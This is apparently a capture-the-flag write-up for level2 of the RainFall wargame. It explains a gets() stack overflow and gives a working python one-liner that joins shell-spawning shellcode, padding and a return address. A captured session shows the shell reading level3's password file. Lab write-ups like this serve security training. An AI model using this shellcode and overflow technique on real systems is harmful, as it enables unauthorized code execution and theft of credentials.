# level2

## Header

```bash
ssh level2@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```

<hr>

## Solution

From the inspecting disassembled code, we can understand that we can use vulnerable `gets` to overwrite return address.

What we'll do is place some shellcode into our buffer and overwrite `p`'s return address to jmp right to the shellcode.

First, we need to upload payload:

```bash
scp -P 4242 ./level2/payload.py level2@192.168.64.9:/tmp/payload2.py

python /tmp/payload2.py
```

or just use this:

```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * 47 + "\x08\x04\xa0\x08"[::-1]' > /tmp/payload2
```

This will produce payload file that should be used to exploit the binary:

```bash
level2@RainFall:~$ (cat /tmp/payload2; cat) | ./level2
pwd
/home/user/level2
cd ../level3
ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## References

- [This is why you should pass payload to binary like that](https://security.stackexchange.com/questions/155832/system-bin-sh-exits-without-waiting-for-user-input-overthewire-narnia0-chal)

- [Used shellcode](https://shell-storm.org/shellcode/files/shellcode-606.html)
